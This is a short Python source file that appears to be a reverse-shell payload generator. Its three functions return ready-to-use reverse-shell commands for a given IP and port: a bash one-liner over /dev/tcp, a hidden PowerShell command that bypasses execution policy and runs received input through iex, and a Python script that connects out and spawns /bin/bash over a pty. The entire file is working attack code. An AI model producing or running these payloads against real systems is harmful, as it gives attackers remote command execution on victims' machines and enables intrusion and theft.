
def bash_reverse_shell(ip: str, port: int) -> str:
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

def windows_powershell_reverse_shell(ip: str, port: int) -> str:
    return (
        f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}}; "
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        f"$sendback = (iex $data 2>&1 | Out-String );"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
    )

def python_reverse_shell(ip: str, port: int) -> str:
    return f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{ip}',{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
"""
